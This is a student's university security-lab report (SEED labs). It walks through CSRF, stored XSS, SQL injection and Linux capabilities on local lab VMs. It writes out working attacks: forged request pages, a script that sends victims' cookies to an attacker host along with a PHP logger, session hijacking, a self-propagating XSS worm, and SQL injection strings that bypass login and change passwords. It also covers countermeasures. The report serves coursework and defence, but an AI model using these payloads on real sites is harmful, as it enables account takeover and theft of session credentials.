Report of IERG 4130 Lab One
========================
- WANG Xianbo
- 1155047126

## Declaration
I declare that the assignment here submitted is original except for source material explicitly acknowledged, and that the same or related material has not been previously submitted for another course. I also acknowledge that I am aware of University policy and regulations on honesty in academic work, and of the disciplinary guidelines and procedures applicable to breaches of such policy and regulations, as contained in the website http://www.cuhk.edu.hk/policy/academichonesty/

**Name: WANG Xianbo**

**Student ID: 1155047126**

## Lab environment and tools

All the environment setup basically follows the instructions in the SEED handbook. I will only list the differences here:
- In this whole experiment I changed my host machine's local DNS record in `/etc/hosts` to point to virtual machine and do all the test in host rather than the virtual machine. 
- I use _BurpSuite_ and set it as proxy in _Chrome_, instead of _FireFox_ + _LiveHTTPHeaders_ in SEED handbook. Since it's more convenient to capture/modify HTTP requests.

## CSRF Lab

### Task 1: Attack using HTTP GET request

To start our analysis, we first login as `admin`, create a new topic under _Test Forum 1_, with title _I am admin_ and content `I am the most powerful man here. Only I can create a post.`

Meanwhile we intercept all the HTTP communications from/to our browser.
We noticed that when we try to create a new topic, following GET request was made:
```HTTP
GET /posting.php?subject=I+am+admin&addbbcode18=%23444444&addbbcode20=0&helpbox=Insert+image%3A+%5Bimg%5Dhttp%3A%2F%2Fimage_url%5B%2Fimg%5D++%28alt%2Bp%29&message=I+am+the+most+powerful+man+here.+Only+I+can+create+a+post.&topictype=0&poll_title=&add_poll_option_text=&poll_length=&mode=newtopic&f=1&post=Submit HTTP/1.1
Host: www.csrflabphpbb.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
Referer: http://www.csrflabphpbb.com/posting.php?mode=newtopic&f=1
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4
Cookie: phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D; phpbb2mysql_sid=3530e6094b1dec0098e0fa1718e74517
Connection: close
```

By observing the URL, we find following interesting parameters:
- `subject`: the title of the post
- `message`: the content of the post
- `topictype`: 0 for normal post

Now we try to construct a GET request to create a post using ``<img>`` element. And we include this evil image in our page hosted at www.CSRFLabAttacker.com. To modify that page, we edit ``/var/www/CSRF/Attacker/index.html`` and insert this `<img>` tag inside body block.
```html
<img src="http://www.csrflabphpbb.com/posting.php?subject=I%20am%20attacker&message=I%20am%20evil%20and%20I%20can%20do%20anything.&topictype=0&mode=newtopic&f=1&post=Submit"/>
```

Now we perform as the ``admin`` who some how visited the attacker's malicious webpage (http://www.CSRFLabAttacker.com). Then his browser will render the `<img>` tag and then send a GET request with URL set by `src` attribute along with ``admin``'s cookies. As expected, we see the new post created by `admin` in the forum without his approval.

![Evil Post][evilpost]

### Task 2: Attack in HTTP POST request
As before, we login as `admin` and then intercept HTTP request data while we modify the profile. 

This is the POST request for editing user's profile:
```HTTP
POST /profile.php HTTP/1.1
Host: www.csrflabphpbb.com
Content-Length: 440
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://www.csrflabphpbb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: http://www.csrflabphpbb.com/profile.php?mode=editprofile&sid=b19c3b59ded8db686bdaedca495bb39e
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4
Cookie: phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D; phpbb2mysql_sid=b19c3b59ded8db686bdaedca495bb39e
Connection: close

username=admin&email=admin%40seed.com&cur_password=admin&new_password=newpwd&password_confirm=newpwd&icq=&aim=&msn=&yim=&website=&location=&occupation=&interests=&signature=&viewemail=1&hideonline=0&notifyreply=0&notifypm=1&popup_pm=1&attachsig=0&allowbbcode=1&allowhtml=0&allowsmilies=1&language=english&style=1&timezone=0&dateformat=d+M+Y+h%3Ai+a&mode=editprofile&agreed=true&coppa=0&user_id=2&current_email=admin%40seed.com&Submit=Submit
```

To forge the POST request and change user's signature, attacker can modifies his malicious page `/var/www/CSRF/Attacker/index.html` with following contents:
```HTML
<html>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>
<form method="POST" action="http://www.csrflabphpbb.com/profile.php">
<input type="hidden" name="username" value="admin"/>
<input type="hidden" name="email" value="admin@seed.com"/>
<input type="hidden" name="signature" value="I am stupid"/>
<input type="hidden" name="mode" value="editprofile"/>
<input type="hidden" name="user_id" value="2"/>
<input type="hidden" name="Submit" value="Submit"/>
</form>
<script>
$("form").submit();
</script>
</html>
```
When `admin` visits this malicious page, his signature was modified to *"I am stupid"*.

Note that, we cannot alter the password using this method because current password needs to be provided to change password, which we apparently don't know. Also, if we want to change a particular user's information like signature, we need the **username** and corresponding **email** and **user_id**. Fortunately, all these informations are public, so such attack can be achieved.


### Task 3: Understanding phpBB's Countermeasures

Repeat attack in **Task 1** and **Task 2** to www.OriginalphpBB.com, we find that both of them no longer work. In the GET request forgery attack, the server simply doesn't accept GET request for creating a new post. And in the POST request forgery attack, server will examine the **sid**, which others wouldn't know since the protection of SOP. Without knowing **sid**, none of the attacks will work.

The attacker may get other's **sid** in following cases:

- There is a XSS vulnerability so that attacker can access victim's cookies.
- The attacker may have read access of the database and read victim's **sid** from database.
- By some way, the SOP was passed.

As a conclusion, in general, under the protection of SOP and assuming that no other vulnerabilities exist, the countermeasure cannot easily get bypassed.


## XSS Lab

### Task 1: Posting a Malicious Message to Display Cookies

We login as Bob, then we create a post with title _**See here**_ and content as follows:
```JavaScript
Nothing here
<script>alert('XSS');</script>
```

Since the content of the malicious post is stored in database, whenever someone view the post, he will see the post along with an alert box:
![XSS alert][alert]

### Task 2: Posting a Malicious Message to Display Cookies

In this task, we simply repeat what we did in task 1 except that this time we write following post content:
```JavaScript
Nothing here
<script>alert(document.cookie);</script>
```

Then one who view this post will see an alert with his own cookies:
![Cookies alert][cookies]

### Task 3: Stealing Cookies from the Victim’s Machine

To steal the cookies, we first again create a malicious post with JavaScript inserted. This time, we insert the following JavaScript:
```HTML
<script>
document.write('<img src=http://www.csrflabattacker.com/receiver.php?c='+escape(document.cookie)+'>');
</script>
```
A user who view this post will automatically send an request to www.CSRFLabAttacker.com (the one we use in CSRF Lab) with his cookies attached.

The only thing left to be done is writing the receiver program. Here we use PHP to write the receiver and save it to ``/var/www/CSRF/Attacker/receiver.php``. The receiver program will record the cookies received in ``cookies.log`` under the same directory.

Code of receiver.php:
```PHP
<?php
$cookies = str_replace('; ' , ";\n", urldecode($_GET['c']));
$txt = date('c')."\n$cookies\n\n";
$fp = fopen('cookies.log','a');
fwrite($fp,$txt);
fclose($fp);
?>
```

Then when a user view this malicious post, he will send his cookies to attacker's server and then the ``receiver.php`` on attacker's server will log the cookies in `cookies.log` in following format:
```
2016-03-26T12:35:28-04:00
phpbb2mysql_data=a:2:{s:11:"autologinid";s:0:"";s:6:"userid";s:1:"4";}; phpbb2mysql_sid=3526a33ffcebcf4a720b3d34c134f796; phpbb2mysql_t=a:5:{i:5;i:1459007089;i:6;i:1459010128;i:1;i:1459008010;i:3;i:1459008014;i:2;i:1459008017;}
```

Let's test it. We login as ``admin`` and ``alice``, then visit the malicious post **_See here_**, then we check the `cookies.log` on attacker's server. We see that both user's cookies are recorded here:
```JavaScript
2016-03-27T04:09:20-04:00
phpbb2mysql_data=a:2:{s:11:"autologinid";s:0:"";s:6:"userid";s:1:"3";};
phpbb2mysql_sid=5b731224c852f7c8ab17716a3e40592c;
phpbb2mysql_t=a:5:{i:5;i:1459007089;i:6;i:1459066160;i:1;i:1459008010;i:3;i:1459008014;i:2;i:1459008017;}

2016-03-27T04:09:29-04:00
phpbb2mysql_data=a:2:{s:11:"autologinid";s:0:"";s:6:"userid";s:1:"2";};
phpbb2mysql_sid=03d5e0d2a0d6a9af2e5c84288ee0e842;
phpbb2mysql_t=a:5:{i:5;i:1459007089;i:6;i:1459066169;i:1;i:1459008010;i:3;i:1459008014;i:2;i:1459008017;}
```
We noticed that in the serialized object, `userid` indicates which user's cookies it is. Here, The first user has `userid=3` and the second has `userid=2`. They are `alice` and `admin` respectively.

### Task 4: Impersonating the Victim using the Stolen Cookies

In this task, instead of writing a program to do impersonation work, we simply use _BurpSuite_ to send request with cookies we harvested in last task. For example, we send a POST request to `posting.php` with cookies of `admin`:
```HTTP
POST /posting.php HTTP/1.1
Host: www.xsslabphpbb.com
Content-Length: 107
Cookie: phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D; phpbb2mysql_sid=03d5e0d2a0d6a9af2e5c84288ee0e842
Content-Type: application/x-www-form-urlencoded

subject=I+am+cookie+stealer&mode=newtopic&sid=03d5e0d2a0d6a9af2e5c84288ee0e842&f=1&post=Submit&message=haha
```
By looking at the response HTML, we can see that we have successfully logged in as `admin`. Also, we can check that a new post titled _**I am cookie stealer**_ has been put on board. Here, one thing to notice is that we (attacker) have the same IP address as that used by `admin`. Otherwise this would not work.

### Task 5: Writing an XSS Worm
In task, we are going to write a XSS worm. Once somebody views the post containing this worm, the worm will be triggered and a new post will be created by the user without his approval.
The worm has following content:
```HTML
<script>
Ajax=new XMLHttpRequest();
Ajax.open("POST","posting.php",true);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
sid=document.cookie.match(/sid=(\w*);/)[1];
Ajax.send("subject=Aha&mode=newtopic&f=1&post=Submit&sid="+sid+"&message=Boom!%20You%20got%20infected");
</script>
```
We should pay attention that phpBB parse insert `<br/>` as new lines for us, which will cause errors. So we simply merge all contents into one line when we create do actual work. Also as we known in previous tasks, we need to extract user's **sid** from cookies to create a new post.

When some other users view this malicious post, he will automatically create a new post with title _Aha_ and message _Boom! You got infected_.


### Task 6: Writing a Self-Propagating XSS Worm
In task, we are going to write a XSS worm that can self-propagate. Once somebody views the post containing this worm, the worm will be triggered and a new post containing a copy of the worm will be created under the name of the victim.
The worm is a post whose contents are like this:
```HTML
<div id="worm">
Boom! You got infected.
<script>
Ajax=new XMLHttpRequest();
Ajax.open("POST","posting.php",true);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
sid=document.cookie.match(/sid=(\w*);/)[1];
w=document.getElementById('worm');
w=encodeURIComponent('<div id="worm">'+w.innerHTML+'</div>');
Ajax.send("subject=XSS+Worm&mode=newtopic&f=1&post=Submit&sid="+sid+"&message="+w);
</script>
</div>
```
Again, as the same reason we know before, we need to merge above code into one line before posting.

Then we simulate following scenery: 
1. `ted` is the attacker, he create a new post containing the XSS worm.
2. `bob` is curious and he click into the post created by `ted`
3. `alice` is a friend of `bob`, she looked the worm post created by `bob`
4. `admin` see lots of _XSS Worm_ post, he wants to know what's happening and views alice's post.

The screen shot shows the result of above actions by different users:
![Result of XSS Worm][worm]
Every time someone views a XSS worm post, he will create a copy of the post. By this way the worm will reproduce itself rapidly in the forum.


## SQL Injection Attack Lab

Before we do the tasks, we turn off `magic_quotes_gpc` in `/etc/php5/apache2/php.ini`.

### Task 1: SQL Injection Attack on `SELECT` Statements
Since the login program directly concatenate user input into SQL statement without any checking, it is vulnerable to SQL injection attack. In this task, we show that we can login as any users without knowing their password.
We do it like this: use `admin or ''='` as username and password is arbitrary. Then we can login as admin (and any user) without correct password. With this username and password `123456`, the SQL statement becomes:
```SQL
SELECT user_id, username, user_password, user_active, user_level,
    user_login_tries, user_last_login_try
    FROM USERS_TABLE
    WHERE username = 'admin' or ''='' AND user_password = 'md5(123456)';
```
Since precedence level of ``AND`` is higher than ``OR``, so the condition ``username = 'admin' OR (''='' AND user_password = 'anything')`` is true. Therefore we can login into the system as `admin`.

To modify the database (e.g. change user's password directly), we try to use ``admin';UPDATE phpbb_users SET user_password=md5("123456") WHERE username = 'admin`` as user name, then the SQL statement becomes this:
```SQL
SELECT user_id, username, user_password, user_active, user_level,
    user_login_tries, user_last_login_try
    FROM USERS_TABLE
    WHERE username = 'admin';UPDATE phpbb_users SET user_password=md5("123456") WHERE username = 'admin' AND user_password = 'md5(123456)';
```
If this work as expected, the `UPDATE` statement will be executed after `SELECT` statement. But after trying we see that it actually doesn't work. The `UPDATE` statement was not executed successfully. 

By looking up online, we find that **stacked query** is not allowed by default in ``MySQL+PHP``. But in other environment like ``MySQL+ASP.NET`` and ``MSSQL+PHP``, it is allowed. (See http://www.blackhat.com/presentations/bh-usa-09/DZULFAKAR/BHUSA09-Dzulfakar-MySQLExploit-SLIDES.pdf)

Also, by looking at PHP's manual, we find that it is actually the Mysql API which disallow multiple queries by default to prevent SQL injection attack. There is an particular function called `mysqli_multi_query()` that support multiple queries. (See http://php.net/manual/en/mysqli.quickstart.multiple-statement.php)


### Task 2: SQL Injection on UPDATE Statements
First we do a quick black box test on those fields in profile edit page by adding a single quote (`'`) to them. We notice that fields like `interests` will trigger SQL errors, so we look further into the code of `include/usercp_register.php`.

Then we find that the code for constructing `UPDATE` SQL statement is like this (partial):
```PHP
$sql = "UPDATE".USER_TABLE."SET user_interests = '" . str_replace("\'", "''", $interests)."'WHERE user_id = $user_id"
```
Here `$interests` is unfiltered user input. It is vulnerable to SQL injection.

To demonstrate it, we login as `bob`.

Then we use following input as interests to update **admin**'s interests without knowing his password:
```
get pwned' where username='admin';#
```
Then the SQL statement will look like this:
```SQL
UPDATE table SET user_interests = 'get pwned' where username='admin';#'WHERE user_id=4;
```
Note that string after `#` are treated as comments, so executing this SQL will actually update **admin**'s interests to _get pwned_.

Similarly, we fill our interests with following content:
```
get pwned', user_password=md5(123456) where username='admin';#
```
Then `admin`'s password will be changed to 123456, then we are able to login as `admin`

### Task 3: Countermeasures

#### Task 3.1: Escaping Special Characters using `magic_quotes_gpc`
We remember we have set `magic_quotes_gpc = Off` before we start our Lab. Now to study the effect of this option, we turn it back on. Then we find that all previous attacks will no longer work. Also, filling (`'`) in profile will no longer trigger errors and the profile can be updated with (`'`) in it.

#### Task 3.2: Escaping Special Characters using `addslashes()`
After recovering the original phpBB code in ``common.php``, we see how it works:
- If `magic_quotes_gpc` is turned on, all `'` will be turned into `\'` automatically.
- If `magic_quotes_gpc` is turned off, the code will do the work. It will apply `addslashes()` to all requested values to make sure all quotes are escaped.

By doing this, it will prevent SQL injection attacks.

#### Task 3.3: Escaping Special Characters using `mysql_real_escape_string`
We replace all `addslashes()` in `common.php` with that `AND FALSE` deleted. And we turn `magic_quotes_gpc` off. Then test again we can find that all previous SQL injection attacks will not work.

#### Task 3.4: Prepared Statement
We fix SQL injection in `login.php` as an example, others are very similar.

The vulnerable part of the code is:
```PHP
$sql_checkpasswd = "SELECT user_id, username, user_password, user_active, user_level, user_login_tries, user_last_login_try
        FROM " . USERS_TABLE . "
        WHERE username = '" . $username . "'" . " AND user_password = '" . md5($password). "'";
        if ( !($result_checkpasswd = $db->sql_query($sql_checkpasswd)) ) {
            ...
        }
```

To fix it using prepared statement, we change the code into:
```PHP
$sql_checkpasswd = $db->prepare("SELECT user_id, username, user_password, user_active, user_level, user_login_tries, user_last_login_try 
    FROM" . USERS_TABLE . "WHERE username = ? AND user_password = md5(?)");
$sql_checkpasswd->bind_param("ss", $username, $password);
$sql_checkpasswd->execute();
```

Then we can test and check that SQL injection vulnerabilities are fixed.


## Linux Capability Exploration Lab

### Task 1: Experiencing Capabilities
`/bin/ping` is a Set-UID program, in this task, we will set it's capabilities. First of all, we use `sudo chmod u-s /bin/ping` to turn it in to non-Set-UID program. After this, when we try to run it, we see this:
```Shell
$ ping localhost
ping: icmp open socket: Operation not permitted
```

Then we set its capability of sending RAW sockets:
```Shell
$ sudo setcap cap_net_raw=ep /bin/ping
$ ping localhost
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.025 ms
...
```

We see that `ping` again works.

#### Question 1
After turning ``/usr/bin/passwd`` into non-Set-UID program, it will give out a `Authentication token manipulation error` while executing.

Then we set ``cap_chown,cap_fowner,cap_dac_override=ep`` to `/usr/bin/passwd`, it will work again.

The reason is that ``passwd`` will write something into ``/etc/shadow``, which is owned by `root`, so it need these three related capabilities.

#### Question 2
- `cap_dac_read_search`: gives a program the capability to bypass file read permission checks
- `cap_dac_override`: gives the capability to bypass file read, write and execute permission checks
- `cap_fowner`: leads to bypassing uid matching checks
- `cap_chown`: gives capability to make changes to uid and gid
- `cap_fsetid`: gives capability the same as set-uid and set-gid
- `cap_sys_module`: load and unload kernel modules
- `cap_kill`: bypass permission for sending signals. e.g. `kill`
- `cap_net_admin`: network configurations. e.g. `ifconfig`
- `cap_net_raw`: send raw sockets. e.g. `ping`
- `cap_sys_nice`: set process nice value. e.g. `setpriority`
- `cap_sys_time`: set system clock. e.g. `stime`

### Task 2: Adjusting Privileges
#### Question 3
After modifying the ``libcap`` and install it, we compile the `use_cap.c` use following commands:
```Shell
$ gcc -c use_cap.c
$ gcc -o use_cap use_cap.o -lcap
```
We run `use_cap` directly we see following outputs:
```
(a) Open failed
(b) Open failed
```
But actually all the `open()` are failed because it doesn't have `CAP_DAC_READ_SEARCH` and it try to enable it, it failed to do so and then returned and exit.

After we execute `sudo setcap cap_dac_read_search=ep use_cap`, we run `use_cap` again and we see these outputs:
```
(b) Open failed
(d) Open failed
(e) Open failed
```
This time only (a) and (c) are opened successfully. It's explanation are as follows:
- In (a), it opened because `CAP_DAC_READ_SEARCH` is turned on.
- Before running to (b), it disabled `CAP_DAC_READ_SEARCH` temporarily.
- In (b), open fails as expected.
- Before running to (c), it enabled `CAP_DAC_READ_SEARCH` again.
- In (c), open successfully as expected.
- Before (d), `CAP_DAC_READ_SEARCH` was deleted permanently.
- In (d), open fails as expected.
- Before (e), trying to enable `CAP_DAC_READ_SEARCH` again.
- In (e), open fails because `CAP_DAC_READ_SEARCH` cannot be enabled anymore.

#### Question 4
To dynamically adjust privileges in ACL mode, we need to reset programs permissions and then restart program. Hence capabilities are much more convenient.

#### Question 5
The attacker has a change to use capability A. He can call ``cap_enable`` and regain capability A. But if it was deleted, the attacker will never be able to use capability A again. 



[evilpost]:pictures/evilpost.png
[alert]:pictures/alert.png
[cookies]:pictures/cookies.png
[worm]:pictures/worm.png
